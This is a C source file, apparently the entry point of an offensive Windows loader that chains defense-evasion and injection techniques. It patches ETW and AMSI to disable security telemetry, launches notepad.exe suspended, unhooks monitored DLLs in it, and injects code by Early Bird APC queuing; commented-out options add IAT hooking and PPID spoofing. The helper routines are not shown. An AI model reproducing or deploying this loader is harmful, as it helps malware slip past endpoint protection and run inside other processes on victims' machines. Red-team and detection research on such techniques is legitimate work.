#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <string.h>
#include "helpers.h"
#include "PEstructs.h"


int main(int argc, char* argv[])
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	STARTUPINFOEX six = { sizeof(six) };
	SIZE_T attributeSize = 0;

	// if payload name is not our
	if (strstr(argv[0], "perunsfart.exe") == 0)
	{
		return 0;
	}


	// Uncomment for patching ETW
	printf("\n***** NTTRACEEVENT PATCHING *****\n");
	etwPatch();


	 // Uncomment to hook some functions in IAT
	//printf("\n***** IAT HOOKING *****\n");
	//Hookem((char*)"Kernel32.dll", (char*)"Sleep", (PROC)HookedSleep);
	//Hookem((char*)"Kernel32.dll", (char*)"CreateRemoteThread", (PROC)HookedCreateRemThr);


	// Uncomment for patching AMSI
	printf("\n***** AMSI PATCHING *****\n");
	amsiPatch();

	// Uncomment for PPID spoofing
	//printf("\n***** PPID SPOOFING *****\n");
	//pi = ppid(attributeSize, six);
	

	// Uncomment for DLL Unhooking
	printf("\n***** DLL UNHOOKING *****\n");
	if (CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, (LPSTARTUPINFOA)&si, &pi) == 0)
		printf("\n\n[!]\tFailed to create process. Error code: %u\n\n", GetLastError()); 
	printf("[+]\tProcess created in suspended state with pid: %d\n", pi.dwProcessId);
	perunfart(pi.hProcess);





	// Uncomment for Process injection / Execution
	// - Earlybird for APC routine in a suspended process
	// - NTInject for simple exectuion with direct NT functions
	printf("\n****** PROCESS INJECTION *****\n");
	earlybird(pi);
	// NTinject(); // Use with IAT Hooking
	

	// Uncomment for some sleeping
	//Sleep(60000);
	//getchar();



	return 0;
}
